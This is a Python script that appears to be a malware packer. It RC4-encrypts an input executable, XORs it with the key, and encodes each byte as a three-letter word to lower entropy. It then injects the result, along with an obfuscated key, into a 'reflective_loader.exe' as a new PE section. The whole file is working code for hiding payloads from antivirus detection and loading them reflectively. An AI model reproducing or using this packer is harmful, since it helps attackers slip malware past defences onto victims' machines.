import os
import sys
from Crypto.Cipher import ARC4
import hashlib
import random
import binascii
import shutil
import lief
import argparse

KEY_LENGTH = 16
PRIME_LENGTH = 8
PRIME_TOP = 60124

wordlist = ["raw", "moo", "zed", "nun", "hin", "ado", "vim", "lip", "tic", "pet", "xis", "tux", "jut", "zap", "fry", "ewe", "ice", "ink", "ask", "lay", "pod", "yam",
            "dig", "paw", "den", "ohm", "jay", "cog", "vex", "rot", "mop", "fad", "ode", "jow", "joy", "thy", "hex", "eel", "ape", "hum", "wop", "era", "jag", "toe",
            "zit", "nab", "cop", "jug", "mad", "oaf", "zag", "tat", "yen", "gym", "hop", "gab", "jab", "end", "tug", "tax", "bud", "bag", "wok", "bug", "yak", "god",
            "tad", "off", "fee", "mud", "nap", "hid", "dew", "add", "jar", "rag", "bus", "new", "hog", "vat", "jib", "jog", "gin", "red", "jam", "tee", "nut", "ale", 
            "sue", "arc", "top", "fin", "fly", "ear", "awe", "pen", "jig", "ate", "qua", "cam", "gut", "pad", "cob", "saw", "lid", "haw", "wag", "ram", "cow", "any",
            "bay", "elk", "owl", "aim", "rut", "dug", "yet", "cup", "fit", "oar", "pun", "ebb", "won", "coy", "urn", "fog", "kin", "qed", "sty", "tag", "gig", "wad",
            "vet", "ore", "fed", "jot", "bop", "gay", "run", "ivy", "tan", "lob", "tab", "gun", "fix", "big", "sit", "gem", "din", "sum", "hip", "cod", "rib", "bun",
            "eon", "zip", "bib", "van", "zoo", "dam", "ion", "woe", "nib", "hen", "ash", "yes", "dot", "rum", "ago", "mug", "icy", "sky", "ova", "ton", "ill", "nip",
            "ham", "jet", "tap", "sax", "lot", "bee", "sob", "mob", "sir", "why", "toy", "foe", "maw", "bet", "lei", "bid", "met", "bye", "box", "vie", "elm", "rue",
            "bed", "yep", "rye", "rub", "him", "mix", "wax", "boo", "way", "axe", "hut", "oak", "dye", "lap", "wed", "lug", "eve", "cub", "nod", "oat", "ace", "cab",
            "awl", "kit", "hay", "ran", "fig", "car", "dim", "log", "gad", "fox", "imp", "bog", "dip", "wry", "gas", "cot", "keg", "dab", "one", "air", "pat", "yip",
            "few", "yap", "nag", "gum", "pan", "orb", "ant", "zen", "hob", "gap", "pew", "men", "egg", "pal"]

def prime_number(n):
    is_prime = [True] * (n+1)
    is_prime[0] = is_prime[1] = False
    for number in range(2, int(n**0.5)+1):
        if is_prime[number]:
            for multiple in range(number*number, n+1, number):
                is_prime[multiple] = False
    return max([number for number, prime in enumerate(is_prime) if prime])


def encrypt_file_rc4_xor_word(input_data):
    # Get Key from random hash bytes
    hash_object = hashlib.sha256(input_data)
    hash_bytes = hash_object.digest()
    start_pos = random.randint(0, len(hash_bytes) - KEY_LENGTH)
    key = hash_bytes[start_pos:start_pos + KEY_LENGTH]

    prime_num = prime_number(PRIME_TOP)
    print("Last prime: ", prime_num)

    cipher = ARC4.new(key)
    rc4_crypted_data = cipher.encrypt(input_data)

    xor_crypted_data = bytearray()
    for i in range(len(rc4_crypted_data)):
        key_byte = key[i % KEY_LENGTH]
        encrypted_byte = rc4_crypted_data[i] ^ key_byte
        xor_crypted_data.append(encrypted_byte)

    encrypted_buf = bytearray()
    for i in range(len(xor_crypted_data)):
        byte_int = int(xor_crypted_data[i])
        encoded_word = bytearray(wordlist[byte_int].encode('ascii'))
        encrypted_buf.extend(encoded_word)

    # Obfuscate key
    obfu_key = bytearray()
    prime_num_bytes = prime_num.to_bytes(PRIME_LENGTH, byteorder='little')
    for i in range(KEY_LENGTH):
        prime_byte = prime_num_bytes[i % PRIME_LENGTH]
        encrypted_key_byte = key[i] ^ prime_byte
        obfu_key.append(encrypted_key_byte)

    key_hex_str = binascii.hexlify(key).decode()
    obfu_key_hex_str = binascii.hexlify(obfu_key).decode()
    print("Used Key: ", key_hex_str)
    print("Obfuscated Key: ", obfu_key_hex_str)

    return (encrypted_buf, obfu_key_hex_str)

def main():
    parser = argparse.ArgumentParser(description='Inject PE into Loader')
    parser.add_argument('input', metavar="FILE", help='input file to inject')
    parser.add_argument('-l', metavar="FILE", help='loader .exe file', required=True, default='reflective_loader.exe')
    parser.add_argument('-o', metavar="FILE", help='output file', default="encoded.exe")

    args = parser.parse_args()

    loader_PE = lief.PE.parse(args.l)

    with open(args.input, "rb") as f:
        input_data = f.read()

    print("Decoded Last Byte:", hex(input_data[0]), "Decoded First Byte:" , hex(input_data[-1]))

    (encrypted_data, key_str) = encrypt_file_rc4_xor_word(input_data)

    encrypted_data_lst = list(encrypted_data)

    packed_section = lief.PE.Section(".rodata")
    packed_section.content = encrypted_data_lst
    packed_section.size = len(encrypted_data_lst)
    packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ
                                    | lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE
                                    | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)

    loader_PE.add_section(packed_section)

    # Will be recalculated by lief if zero
    loader_PE.optional_header.sizeof_image = 0

    # save the resulting PE
    if(os.path.exists(args.o)):
        print("Remove existing file")
        os.remove(args.o)

    lief_PE_builder = lief.PE.Builder(loader_PE)
    lief_PE_builder.build()
    lief_PE_builder.write(args.o)

    encrypted_size = len(encrypted_data_lst)

    print("Original size ", len(input_data))
    print("Encrypted size: ", encrypted_size)
    with open(args.o, "ab") as new_loader_file:
        new_loader_file.write(encrypted_size.to_bytes(8, byteorder='little'))
        new_loader_file.write(key_str.encode('ascii'))


if __name__ == '__main__':
    main()
